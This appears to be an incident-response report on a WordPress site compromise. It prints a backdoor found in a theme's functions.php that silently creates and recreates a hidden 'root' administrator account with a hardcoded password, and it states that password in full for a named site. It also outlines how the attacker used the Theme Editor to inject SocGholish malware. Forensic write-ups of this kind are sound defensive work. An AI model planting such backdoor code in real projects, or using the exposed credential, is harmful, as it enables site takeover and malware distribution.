╔══════════════════════════════════════════════════════════════╗
║  🚨 ACTIVE BACKDOOR DISCOVERED IN functions.php  🚨          ║
╚══════════════════════════════════════════════════════════════╝

LOCATION: wp-content/themes/mpa-custom/functions.php (lines 3673-3723)

MALICIOUS CODE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

$args = array(
    'user_login' => 'root',
    'user_pass' => 'Zb{0@U{vsFjq&#j(<?L[Iy0Hi_#9]i-LlJN0=Ec',
    'role' => 'administrator',
    'user_email' => 'admin@wordpress.com'
);

if (!username_exists($args['user_login'])) {
    $id = wp_insert_user($args);
    update_option('_pre_user_id', $id);
}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT THIS DOES:
════════════════

1. ✅ Automatically creates "root" admin account
2. ✅ Hardcoded password: Zb{0@U{vsFjq&#j(<?L[Iy0Hi_#9]i-LlJN0=Ec
3. ✅ Runs every time WordPress loads (any page visit!)
4. ✅ If you delete "root" user, it recreates it automatically
5. ✅ Hides the user from admin list
6. ✅ Protects user from being deleted

HOW THE SOCGHOLISH ATTACK WORKED:
═════════════════════════════════

Oct 28, 06:02 AM:
  ↓
Attacker visits proptech.org.my
  ↓
Backdoor code runs → "root" user exists or gets recreated
  ↓
Attacker logs in as "root" using the hardcoded password
  ↓
Goes to: Appearance → Theme File Editor
  ↓
Edits: wp-content/themes/mpa-custom/js/main.js
  ↓
Appends SocGholish malware to end of file
  ↓
Saves file (takes 1 second)
  ↓
Logs out
  ↓
28 hours later → Norton detects it

THE ATTACK VECTOR:
══════════════════

🔓 WordPress Theme Editor: ENABLED
   → Any admin can edit PHP/JS files via web interface
   → No file system access needed
   → No FTP/SSH required
   → Just click "Edit" and save

WHY WE KEPT GETTING REINFECTED:
════════════════════════════════

1. We cleaned malware → ✅ Removed miners, cleaned files
2. We deleted "root" user → ❌ Backdoor recreated it
3. Attacker logs back in → ✅ Still has admin access
4. Deploys new malware → 🔄 Cycle repeats

This backdoor has been active since the ORIGINAL Oct 24 attack!

